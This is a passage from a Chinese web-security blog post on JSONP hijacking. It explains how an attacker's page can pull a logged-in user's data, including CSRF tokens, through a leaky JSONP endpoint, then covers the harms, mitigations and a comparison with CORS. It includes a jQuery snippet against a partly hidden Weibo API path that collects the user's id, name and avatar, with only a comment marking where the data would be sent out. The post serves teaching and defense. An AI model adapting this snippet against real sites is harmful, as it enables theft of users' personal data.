<p>当我们发现信息泄露的 jsonp 接口以后我们要做的就是在自己的网站上写一个脚本，然后引诱受害者去访问这个网站，一旦访问了这个网站，脚本就会自动运行，就会想这个接口请求用户的敏感数据，并传送到攻击者的服务器上</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;https://api.weibo.com/2/&#123;隐藏了哦&#125;&#x27;</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;get&#x27;</span>,</span><br><span class="line">    <span class="attr">dataType</span>: <span class="string">&#x27;jsonp&#x27;</span>,</span><br><span class="line">&#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">json</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> id = json[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;id&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> screen_name = json[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;screen_name&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> profile_image_url = json[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;profile_image_url&quot;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> post_data = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    post_data += <span class="string">&quot;id=&quot;</span> + id + <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">    post_data += <span class="string">&quot;screen_name=&quot;</span> + screen_name + <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">    post_data += <span class="string">&quot;profile_image_url=&quot;</span> + <span class="built_in">encodeURIComponent</span>(profile_image_url);</span><br><span class="line">    <span class="built_in">console</span>.log(post_data);</span><br><span class="line">    <span class="comment">// 发送到我的服务器上</span></span><br><span class="line">&#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;);</span><br></pre></td></tr></table></figure>

<p>既然是窃取敏感信息，那么敏感信息除了一些 email 手机号 用户名等还有什么呢？没错，甚至可以是 CSRF Token 信息，有时候在 CSRF token 获取不到但是又找不到 XSS 的攻击点的时候不妨考虑一下 jsonp 劫持。</p>
<h2 id="5、漏洞危害"><a href="#5、漏洞危害" class="headerlink" title="5、漏洞危害"></a>5、漏洞危害</h2><p>JSONP是一种敏感信息泄露的漏洞，经过攻击者巧妙而持久地利用，会对企业和用户造成巨大的危害。攻击者通过巧妙设计一个网站， <strong>网站中包含其他网站的JSONP漏洞利用代码</strong> ，将链接通过邮件等形式推送给受害人， 如果受害者点击了链接，则攻击者便可以获取受害者的个人的信息，如邮箱、姓名、手机等信息， 这些信息可以被违法犯罪分子用作“精准诈骗”。对方掌握的个人信息越多，越容易取得受害人的信任，诈骗活动越容易成功，给受害人带来的财产损失以及社会危害也就越大。</p>
<h2 id="6、防护方案"><a href="#6、防护方案" class="headerlink" title="6、防护方案"></a>6、防护方案</h2><ol>
<li>严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。</li>
<li>严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。</li>
<li>严格过滤 callback 函数名及 JSON 里数据的输出。</li>
<li>严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。</li>
<li>其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。</li>
</ol>
<h1 id="四、CORS与JSONP的比较"><a href="#四、CORS与JSONP的比较" class="headerlink" title="四、CORS与JSONP的比较"></a>四、CORS与JSONP的比较</h1><p>CORS与JSONP的使用目的相同，但是比JSONP更强大。</p>
<p>JSONP只支持<code>GET</code>请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p>
<h1 id="五、参考链接"><a href="#五、参考链接" class="headerlink" title="五、参考链接"></a>五、参考链接</h1><ul>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/113769462">https://blog.csdn.net/weixin_39190897/article/details/113769462</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/happystudyhuan/p/11583384.html">https://www.cnblogs.com/happystudyhuan/p/11583384.html</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://ruanyifeng.com/blog/2016/04/cors.html">https://ruanyifeng.com/blog/2016/04/cors.html</a></p>
</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">w01ke</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://wolke.cn/post/c8aa67d0.html">https://wolke.cn/post/c8aa67d0.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://wolke.cn" target="_blank">wolke</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a><a class="post-meta__tags" href="/tags/CSRF/">CSRF</a></div><div class="post_share"><div class="social-share" data-image="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220310114917215.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/83737637.html"><img class="prev-cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1647248511311-a36177d8-dea8-4ec5-a06f-7c82373b3cbe.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">小米路由器远程命令执行漏洞(CVE-2019-18370，CVE-2019-18371)</div></div></a></div><div class="next-post pull-right"><a href="/post/28755b24.html"><img class="next-cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220309131331789.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">易酷ekucms本地文件包含漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/ecd34c17.html" title="CSRF跨站请求伪造攻击"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/20180928160020BQS.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-31</div><div class="title">CSRF跨站请求伪造攻击</div></div></a></div><div><a href="/post/60a54be8.html" title="CRLF注入（HTTP响应拆分/截断）"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/CRLFlogo_transparent.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-27</div><div class="title">CRLF注入（HTTP响应拆分/截断）</div></div></a></div><div><a href="/post/54d8f8e4.html" title="DNSlog平台的搭建"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220712034730498.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-12</div><div class="title">DNSlog平台的搭建</div></div></a></div><div><a href="/post/a645df71.html" title="PHP检查相等时的漏洞"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/5d84417ee7ad0520.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-13</div><div class="title">PHP检查相等时的漏洞</div></div></a></div><div><a href="/post/472fbc5b.html" title="Redis安全"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/redis-logo-lg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-22</div><div class="title">Redis安全</div></div></a></div><div><a href="/post/98624e3.html" title="SSRF服务器端请求伪造攻击"><img class="cover" src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/2018092817354893l.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-07</div><div class="title">SSRF服务器端请求伪造攻击</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-text">一、前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-text">1、同源策略</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81AJAX%E6%8A%80%E6%9C%AF"><span class="toc-text">2、AJAX技术</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81CORS%E8%B7%A8%E5%9F%9F"><span class="toc-text">二、CORS跨域</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E8%B7%A8%E5%9F%9F%E6%B5%81%E7%A8%8B"><span class="toc-text">1、跨域流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%881%EF%BC%89CORS%E8%B7%A8%E5%9F%9F%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-text">（1）CORS跨域——简单请求的流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#withCredentials-%E5%B1%9E%E6%80%A7"><span class="toc-text">withCredentials 属性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%882%EF%BC%89CORS%E8%B7%A8%E5%9F%9F%E2%80%94%E2%80%94%E9%9D%9E%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-text">（2）CORS跨域——非简单请求的流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0-%E9%A2%84%E6%A3%80%E8%AF%B7%E6%B1%82"><span class="toc-text">① 预检请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-%E9%A2%84%E6%A3%80%E8%AF%B7%E6%B1%82%E7%9A%84%E5%9B%9E%E5%BA%94"><span class="toc-text">② 预检请求的回应</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2-%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E6%AD%A3%E5%B8%B8%E8%AF%B7%E6%B1%82%E5%92%8C%E5%9B%9E%E5%BA%94"><span class="toc-text">③ 浏览器的正常请求和回应</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3-%E6%80%BB%E7%BB%93"><span class="toc-text">④ 总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-text">2、攻击流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-text">3、漏洞验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E9%9D%B6%E5%9C%BA%E5%AE%9E%E4%BE%8B"><span class="toc-text">4、靶场实例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95"><span class="toc-text">5、检测方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E7%BB%93%E5%90%88XSS"><span class="toc-text">6、结合XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-text">7、漏洞扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81%E9%98%B2%E6%8A%A4%E6%96%B9%E6%A1%88"><span class="toc-text">8、防护方案</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81JSONP%E5%8A%AB%E6%8C%81"><span class="toc-text">三、JSONP劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-text">1、利用过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E9%9D%B6%E5%9C%BA%E5%AE%9E%E4%BE%8B"><span class="toc-text">2、靶场实例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-text">3、漏洞挖掘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81JSONP%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="toc-text">4、JSONP漏洞利用技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-text">5、漏洞危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E9%98%B2%E6%8A%A4%E6%96%B9%E6%A1%88"><span class="toc-text">6、防护方案</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81CORS%E4%B8%8EJSONP%E7%9A%84%E6%AF%94%E8%BE%83"><span class="toc-text">四、CORS与JSONP的比较</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">五、参考链接</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2023 By w01ke</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><script type="text/javascript">document.write(unescape("%3Cspan id='cnzz_stat_icon_1280658241'%3E%3C/span%3E%3Cscript src='https://s9.cnzz.com/z_stat.php%3Fid%3D1280658241%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script></div><div class="icp"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><img class="icp-icon" src="/img/gongan.png"/><span>赣ICP备2021004623号-1</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'MynqQPDIzA7sk9p7dF7E8vPi-gzGzoHsz',
      appKey: 'nQR603PJj8t2qUQiGTSeqXrB',
      lang: 'zh-CN',
      avatar: 'monsterid',
      serverURLs: '',
      path: window.location.pathname,
      emojiMaps: {"tvgif-doge":"302d6c88c63ed162c81a49cafe7ed2709e6fb955.gif","tvgif-坏笑":"5d2572efd09aab5dde9e2a198bb3f9ac1e2a982e.gif","tvgif-难过":"9c6b41008a67755410f712334c64313df5f91b3f.gif","tvgif-生气":"1902a5a2df5b5c931d88c12f0feb264b1e109d0d.gif","tvgif-委屈":"af5a5853edb43a8178a8cb5df707fa5e88143699.gif","tvgif-斜眼笑":"c66568b471192ca1f62f6ed4384dc1b283ab7508.gif","tvgif-呆":"d3fa91e4db9215eb1e20ab9da44f1214aa4bda7b.gif","tvgif-发怒":"3959eb81b952e4fa8d269d98f9e3639172d84073.gif","tvgif-惊吓":"13549060757fcd92b11d0657d9b3b6038f97abb6.gif","tvgif-呕吐":"db58e9442aae26694af18cc1683607cca3a16763.gif","tvgif-思考":"b63f9146bfd985af014f8d6d4bdb498805be48f9.gif","tvgif-微笑":"b98656855d782f61cb8edc7f7fca6563ecafff7e.gif","tvgif-疑问":"fce1b1a0f3b0e39a2dc16a18508dba7b91e929f4.gif","tvgif-大哭":"cba61f05f3039b02a7ffc0dfcd9d7995df9fdd74.gif","tvgif-鼓掌":"be106e6b265883a9f28fbe10f7b765701e2618d4.gif","tvgif-抠鼻":"696d9f93e722144dc2a78aeffc569418fdf3d565.gif","tvgif-亲亲":"3534ea44ab74bd20352b88c245a06c4b4c46d271.gif","tvgif-调皮":"fcd967395fd14e4dd5829fa7e8a967ce23205e52.gif","tvgif-笑哭":"1c2fd1e8c9dde12812f86e5d4cbddd8993d98082.gif","tvgif-晕":"030040ec5c9ddc9e3d067658c4139e7314ab42f8.gif","tvgif-点赞":"30ecff401245fb56bcc1cf588d1809ac1ab1607c.gif","tvgif-害羞":"411a3e459e8580f5bfd9f639a408247c4b509935.gif","tvgif-睡着":"3c8b5e293261287a6203597e29b3de07df4d18c6.gif","tvgif-色":"a0c6d99ab0ab63b8648f5283ff72cec04b604828.gif","tvgif-吐血":"e17e4539e169d14a3389ff147afea760cebe5de5.gif","tvgif-无奈":"eb4cb5f07cfd177c7e6a7914316717e56d9cc1d0.gif","tvgif-再见":"344f61609ecce2008520dc8a977b6169215748a9.gif","tvgif-流汗":"390bccec65eaff536bd5bb2a0c5b8b0bdea47334.gif","tvgif-偷笑":"7f11e6f7f63e79112b833bd41fa13a83d7cd8474.gif","tvgif-抓狂":"a476b93ecd8e94ac3257323fd822f91cef212de2.gif","tvgif-黑人问号":"b609adf664be33224a9923262031165ae3e34cd2.gif","tvgif-困":"91c2bf34ecf842d7016c01d841db3d4074bd281f.gif","tvgif-打脸":"b0fad4856e59c1240e448437da3287bb5ce547e5.gif","tvgif-闭嘴":"a3fc5388b09e945be3f18fe23bfed5874a0285b7.gif","tvgif-鄙视":"293b5d459e6264ecf314d20937a936fa672ccd1e.gif","tvgif-腼腆":"30984e8264324f901d19bea85dada7103b695534.gif","tvgif-馋":"2525c5703c594e5f0752f68db8948773caebde47.gif","tvgif-可爱":"f92d20f76258bc5f33fc9d7c5e2a1d41fef19a7c.gif","tvgif-发财":"76131e52c9b033681b4c896c6024d29ef7ec7ec2.gif","tvgif-生病":"beb94829fe04f1a41bd6ca611e1f6ca9ca169afa.gif","tvgif-流鼻血":"8ef473f74a849420da712487b2f56ecca1f695f5.gif","tvgif-尴尬":"e0b84ef5ee3e5b8978e584c7c5a6550c51d15f84.gif","tvgif-大佬":"14ca0c05382b8741940942b2430b7a8d55c02f7e.gif","2233娘-大笑":"16b8794be990cefa6caeba4d901b934a227ee3b8.png","2233娘-吃惊":"d1628c43d35b1530c0504a643ff80b6189fa0a43.png","2233娘-大哭":"476a2a60f6e337b8c0697a592e0aa82781f6b33b.png","2233娘-耶":"d7178e258a0efc969b65ccc2b1322fb235f5dff4.png","2233娘-卖萌":"ea893aa25355de95ab4f03c2dad3f0c58d0c159e.png","2233娘-疑问":"0b41f509351958dbb63d472fec0132d1bd03bd14.png","2233娘-汗":"247cd9df8cdf84b18368c21e3b2dd374e84c0927.png","2233娘-困惑":"714eeb4eae0d0933b4ff08b7df788b1982f6b940.png","2233娘-怒":"f31953119c51b9748016440ac0b632f779929b37.png","2233娘-委屈":"d9d0bf9d358af8d5761093ec66d4e3f60d963a63.png","2233娘-郁闷":"485203fe7100f2c8fc40b2800a18fe20b35f2f1a.png","2233娘-第一":"3754ee6e5985bd0bd7dfb668981f2a8733398ebd.png","2233娘-喝水":"695bf5429472049b52c1e0de586f8a2511195a23.png","2233娘-吐魂":"e999af499edf38a91ca68b1a9d2f97042c1d6734.png","2233娘-无言":"fdb5870f32cfaf7949e0f88a13f6feba4a48b719.png"},
      placeholder: '\\(≧▽≦)/你想说什么呢，记得填邮箱哦',
      pageSize: '',
      lang: 'zh-CN',
      recordIP: true,
      emojiCDN: 'https://i0.hdslb.com/bfs/emote/',
      enableQQ: true,
      tagMeta: ["博主","小伙伴","访客"],
      master: '1e45134c2d9e333e8889556513f09903',
      friends: ['5029a42d22ca4d65e16cf3fdd9654ffe'],
      requiredFields: ['nick','mail'],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('/js/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script src="//lib.baomitu.com/jquery/3.3.1/jquery.min.js"></script><script src="https://myhkw.cn/api/player/1641175681147" id="myhk" key="1641175681147" m="1"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐" data-fontsize="15px" data-random="false" async="async"></script><script>(function(d, w, c) {
    w.ChatraID = 'EqStaz8vFN6KYhHzY';
    var s = d.createElement('script');
    w[c] = w[c] || function() {
        (w[c].q = w[c].q || []).push(arguments);
    };
    s.async = true;
    s.src = 'https://call.chatra.io/chatra.js';
    if (d.head) d.head.appendChild(s);
})(document, window, 'Chatra');

if (true) {
  var chatBtnFn = () => {
    var chatBtn = document.getElementById("chat_btn")
    chatBtn.addEventListener("click", function(){
      Chatra('openChat')
    });
  }
  chatBtnFn()
} else {
  if (false) {
    function chatBtnHide () {
      Chatra('hide')
    }
    function chatBtnShow () {
      Chatra('show')
    }
  }
}</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
  'title',
  '#config-diff',
  '#body-wrap',
  '#rightside-config-hide',
  '#rightside-config-show',
  '.js-pjax'
]

if (false) {
  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
}

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: true,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.removeEventListener('scroll', window.tocScrollFn)
  window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', 'G-Q0YHC68NHX', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>